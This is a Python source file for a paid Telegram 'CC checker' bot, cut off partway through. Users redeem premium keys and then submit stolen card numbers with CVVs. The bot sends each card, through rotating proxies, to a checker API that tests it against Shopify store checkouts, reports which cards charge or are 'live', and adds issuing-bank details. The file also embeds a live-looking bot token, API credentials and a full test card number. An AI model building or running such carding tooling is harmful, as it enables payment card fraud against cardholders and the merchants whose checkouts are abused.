from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError
# Direct API endpoint (replaces checker_bridge)
CHECKER_API_URL = 'http://127.0.0.1:8081/shopify'
PRIVATE_CHANNEL_ID = -1003825986702

def is_owner(user_id):

    try:
        with open(PREMIUM_FILE, "r") as f:
            owners = f.read().splitlines()

        return str(user_id) in owners

    except:
        return False


# Premium Custom Emoji IDs (bot must be created with Telegram Premium account)
# Use @RawDataBot to get custom_emoji_id for any premium emoji
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",   # ✨ Multi Sparkles / Celebration
    "🔥": "5999340396432333728",   # 🔥 Purple Flame Heart
    "❌": "6037570896766438989",   # 💀 White Skull (Dark Glow)
    "⚡": "6026367225466720832",   # ⚡ Yellow Lightning Bolt
    "💳": "5971944878815317190",   # 💫 Floating Color Dots
    "💠": "5971837723676249096",   # 🌀 Neon Circle Rings
    "📝": "6023660820544623088",   # ✨
    "🌐": "6026367225466720832",   # ⚡
    "🎯": "5974235702701853774",   # 🟠🟡🟢 Triple Ring Loader
    "🤖": "6057466460886799210",   # 😼 Dark Cat Face
    "🤵": "4949560993840629085",   # 🧠 Golden Maze
    "💰": "5971944878815317190",   # 💫
    "⏸️": "6001440193058444284",   # ⚙️ Arc Reactor
    "▶️": "6285315214673975495",   # ➡️ Neon Arrow Right
    "🛑": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "📊": "5971837723676249096",   # 🌀
    "📦": "6066395745139824604",   # 🎀 Neon Pink Bow
    "📋": "5974235702701853774",   # Triple Ring
    "🔄": "5971837723676249096",   # 🌀 Neon Circle Rings
    "⏳": "5971837723676249096",   # 🌀
    "🚀": "6282977077427702833",   # 🎉 Color Confetti
    "⚠️": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "💎": "6023660820544623088",   # ✨
}

def premium_emoji(text):
    """Replace Unicode emojis with <tg-emoji emoji-id="..."> for Premium custom emojis.
    Requires a Telethon/parser that supports <tg-emoji emoji-id="ID"> in HTML (e.g. Telethon 2.x or custom parser).
    Bot must be created with a Telegram Premium account for custom emojis to send."""
    if not text:
        return text
    # Use placeholders to avoid replacing the same emoji inside tags again
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# Bot Configuration
API_ID = 36004853
API_HASH = 'c7177a258363a75ddb1352816ba970cf'
BOT_TOKEN = '8506688952:AAGeX5Fk_CidqxRKw1J-rzxAcThuWn-46DY'

# Force Join Config
CHANNEL_ID = -1003346517656
GROUP_ID = -1003674925513

CHANNEL_LINK = "https://t.me/+YVoVJw35RQ44OTg1"
GROUP_LINK = "https://t.me/+RCE7LlYKgww4N2Rl"


# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
USERS_FILE = "users.txt"
KEYS_FILE = "keys.txt"

# Initialize bot
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ================= PREMIUM CHECK SYSTEM =================

@bot.on(events.NewMessage(incoming=True))
async def premium_check(event):

    message_text = event.raw_text.lower()
    # FREE COMMANDS
    if (
        message_text.startswith("/start")
        or message_text.startswith("/redeem")
    ):
        return

    # Ignore groups
    if event.is_group:
        return

    # Ignore bots
    if event.sender.bot:
        return

    user_id = str(event.sender_id)

    message_text = event.raw_text.lower()

    # ================= OWNER / ADMIN CHECK =================

    try:

        with open(PREMIUM_FILE, "r") as f:

            owners = f.read().splitlines()

    except:
        owners = []

    # OWNER = FULL ACCESS
    if user_id in owners:
        return

    # ================= PREMIUM USER CHECK =================

    premium = False

    try:

        with open(USERS_FILE, "r") as f:

            users = f.readlines()

    except:
        users = []

    from datetime import datetime

    for line in users:

        line = line.strip()

        if not line:
            continue

        try:

            saved_user_id, expiry = line.split("|")

        except:
            continue

        # MATCH USER
        if user_id == saved_user_id:

            expiry_date = datetime.strptime(
                expiry,
                "%Y-%m-%d"
            )

            # ACTIVE PREMIUM
            if expiry_date >= datetime.now():

                premium = True
                break

    # ================= PREMIUM USERS =================

    if premium:

        # Allowed commands for premium users
        allowed_commands = [
            "/cc",
            "/start",
            "/help"
            ]
        
         # Allow only these commands
        if any(message_text.startswith(cmd) for cmd in allowed_commands):
            return
        
        await event.reply(
            """
❌ Key users can only use:

/cc
/start
/addproxy
"""
        )

        return

    # ================= NORMAL USERS =================

    else:

        # ONLY /redeem ALLOWED
        if (
            message_text.startswith("/start")
            or message_text.startswith("/redeem")
        ):
            await event.reply(
            """
⚠️ Only premium users can use this bot.

Use:
/redeem <key>
"""
        )

        return

# ================= PREMIUM KEY SYSTEM =================

from datetime import datetime, timedelta

# ================= GENERATE RANDOM KEY =================

def generate_key():

    import random
    import string

    random_part = ''.join(
        random.choices(
            string.ascii_letters + string.digits,
            k=20
        )
    )

    return f"Kesav1-{random_part}"

# ================= GENERATE KEYS =================
# Usage:
# /genkey 3 10

@bot.on(events.NewMessage(pattern=r'/genkey (\d+) (\d+)'))
async def generate_keys(event):

    user_id = str(event.sender_id)

    # OWNER CHECK
    try:

        with open(PREMIUM_FILE, "r") as f:

            owners = f.read().splitlines()

    except:
        owners = []

    if user_id not in owners:

        await event.reply(
            "❌ Owner only command."
        )

        return

    days = int(event.pattern_match.group(1))
    amount = int(event.pattern_match.group(2))

    generated = []

    for _ in range(amount):

        key = generate_key()

        generated.append(key)

        with open(KEYS_FILE, "a") as f:

            f.write(
                f"{key}|{days}|unused\n"
            )

    text = f"""
✅ Keys Generated

⭐ Count ➜ {amount}
🔥 Plan ➜ {days} Days
☑️ Keys
"""

    for key in generated:

        text += f"\n• {key}"

    text += "\n\n⚡ Redeem with:\n/redeem <key>"

    await event.reply(text)

# ================= REDEEM KEY =================

@bot.on(events.NewMessage(pattern=r'/redeem (.+)'))
async def redeem_key(event):

    user_id = str(event.sender_id)

    redeem_key = (
        event.pattern_match.group(1)
        .strip()
    )

    try:

        with open(KEYS_FILE, "r") as f:
            keys = f.readlines()

    except FileNotFoundError:

        await event.reply(
            "❌ No keys generated yet."
        )

        return

    found = False
    updated_keys = []

    for line in keys:

        line = line.strip()

        if not line:
            continue

        try:

            key, days, status = line.split("|")

        except:
            continue

        # VALID KEY
        if key == redeem_key:

            found = True

            # USED KEY
            if status == "used":

                await event.reply(
                    "❌ This key is already used."
                )

                return

            # EXPIRY DATE
            expiry_date = (
                datetime.now() +
                timedelta(days=int(days))
            ).strftime("%Y-%m-%d")

            # SAVE PREMIUM USER
            with open(USERS_FILE, "a") as pf:

                pf.write(
                    f"{user_id}|{expiry_date}\n"
                )

            # MARK USED
            updated_keys.append(
                f"{key}|{days}|used\n"
            )

            await event.reply(
                f"""
✅ Premium Activated

⭐ Plan ➜ {days} Days
📅 Expiry ➜ {expiry_date}

⚡ You can now use:
/cc
"""
            )

        else:

            updated_keys.append(
                line + "\n"
            )

    # INVALID KEY
    if not found:

        await event.reply(
            "❌ Invalid redeem key."
        )

        return

    # SAVE UPDATED KEYS
    with open(KEYS_FILE, "w") as f:

        f.writelines(updated_keys)

# Initialize bot
# ================= FORCE JOIN SYSTEM =================

@bot.on(events.NewMessage(pattern='/start'))
async def force_start(event):

    user_id = event.sender_id

    try:

        # Check channel
        await bot(GetParticipantRequest(
            CHANNEL_ID,
            user_id
        ))

        # Check group
        await bot(GetParticipantRequest(
            GROUP_ID,
            user_id
        ))

        # SUCCESS MESSAGE
        await event.respond(
            f"""
✅ Verification Successful

Welcome {event.sender.first_name} 🎉

Now you can use this bot.
"""
        )

    except UserNotParticipantError:

        buttons = [
            [
                Button.url(
                    "💎 Join Channel",
                    CHANNEL_LINK
                ),

                Button.url(
                    "💬 Join Group",
                    GROUP_LINK
                )
            ],
            [
                Button.inline(
                    "☑️ Verify Joined",
                    data=b"verify_join"
                )
            ]
        ]

        await event.respond(
            """
🔗 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗
━━━━━━━━━━━━━━━━━━━━
𝗝𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 & 𝗴𝗿𝗼𝘂𝗽 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁.
━━━━━━━━━━━━━━━━━━━━
 𝟭. 𝗝𝗼𝗶𝗻 𝗯𝗼𝘁𝗵 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄 (𝘀𝗮𝗺𝗲 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗮𝗰𝗰𝗼𝘂𝗻𝘁)
 𝟮. 𝗧𝗮𝗽 𝗝𝗼𝗶𝗻𝗲𝗱 𝘁𝗼 𝘃𝗲𝗿𝗶𝗳𝘆
""",
            buttons=buttons
        )

        raise events.StopPropagation

# ================= VERIFY BUTTON =================

@bot.on(events.CallbackQuery(data=b"verify_join"))
async def verify_join(event):

    user_id = event.sender_id

    try:

        # Check channel
        await bot(GetParticipantRequest(
            CHANNEL_ID,
            user_id
        ))

        # Check group
        await bot(GetParticipantRequest(
            GROUP_ID,
            user_id
        ))

        # SUCCESS
        await event.edit(
            f"""
✅ Verification Successful

Welcome 🎉

Now you can use this bot.
"""
        )

    except UserNotParticipantError:

        buttons = [
            [
                Button.url(
                    "💎 Join Channel",
                    CHANNEL_LINK
                ),

                Button.url(
                    "💬 Join Group",
                    GROUP_LINK
                )
            ],
            [
                Button.inline(
                    "☑️ Verify Again",
                    data=b"verify_join"
                )
            ]
        ]

        await event.edit(
            """
❌ You Have Not Joined Yet

Please join both the channel and group
before verifying again.
""",
            buttons=buttons
        )

# Store active checking sessions
active_sessions = {}

# Dead site error keywords
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)
# --- UPDATED LOADING FUNCTIONS ---
def get_file_lines(filepath):
    """Helper to read lines from a file fresh every time"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):

    user_id = str(user_id)

    # ================= OWNER / ADMIN =================

    try:

        with open(PREMIUM_FILE, "r") as f:

            owners = f.read().splitlines()

            # Owner/Admin
            if user_id in owners:
                return True

    except:
        pass

    # ================= REDEEMED USERS =================

    try:

        with open(USERS_FILE, "r") as f:

            users = f.readlines()

    except:
        return False

    from datetime import datetime

    for line in users:

        line = line.strip()

        if not line:
            continue

        try:

            saved_user_id, expiry = line.split("|")

        except:
            continue

        # Match user
        if user_id == saved_user_id:

            expiry_date = datetime.strptime(
                expiry,
                "%Y-%m-%d"
            )

            # Premium active
            if expiry_date >= datetime.now():

                return True

    return False

def extract_cc(text):
    """Extract CC from text in format: card|month|year|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    """Check if error indicates dead site"""
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    """Get BIN info from API"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    """Check a single card against a site using the direct checker API"""
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        params = {
            'cc': card,
            'url': site,
            'proxy': proxy
        }
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'shopiii')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success',
            'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    """Check a card with automatic retry"""
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)  # Reduced from 0.5

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type, username):
    """Send real-time notification with new design"""
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    message = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=8348667414">ㅤㅤK E S A V</a></b>"""

    try:
        await bot.send_message(
        user_id,
        premium_emoji(message),
        parse_mode='html'
        )

        if hit_type == ["Approved", "Charged"]:
            await bot.send_message(
            PRIVATE_CHANNEL_ID,
            premium_emoji(message),
            parse_mode='html'
        )

    except:
        pass
    
 

        



async def update_progress(user_id, message_id, results, current_attempt_count):
    """Update progress message with new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    progress_text = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    """Send final results with txt file and new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    # Build hits text
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    summary = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=8348667414">ㅤㅤK E S A V</a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

async def test_site(site, proxy):
    """Test a single site using the direct checker API with a test card"""
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    """Test a single proxy using the direct checker API with a test card and site"""
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'url': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        else:
            return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to 𝐒𝐡𝐨𝐩𝐢 𝐗 ! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
            "• /chk - Reply to .txt file to check cards</blockquote>\n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /site - Check all sites & remove dead\n"
            "• /rm url - Remove a specific site</blockquote>\n"
            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /proxy - Check all proxies & remove dead\n"
            "• /addproxy - Add proxies (one per line)\n"
            "• /chkproxy proxy - Check single proxy\n"
            "• /rmproxy proxy - Remove single proxy\n"
            "• /rmproxyindex 1,2,3 - Remove by index\n"
            "• /clearproxy - Remove all proxies\n"
            "• /getproxy - Get all proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚠️ Only premium users can use this bot.</b>"
        ),
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    """Check a single CC"""
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
        first_name = sender.first_name if sender.first_name else "User"
    except:
        username = f"user_{user_id}"
        first_name = "User"

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode='html'
    )

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "𝐋𝐢𝐯𝐞"
        else:
            status_emoji = "❌"
            status_text = "𝐃𝐞𝐚𝐝"

        final_resp = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=8348667414">ㅤㅤK E S A V</a></b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    """Check a single proxy"""
    user_id = event.sender_id

    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    """Remove a single proxy from proxy.txt"""
    user_id = event.sender_id

    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
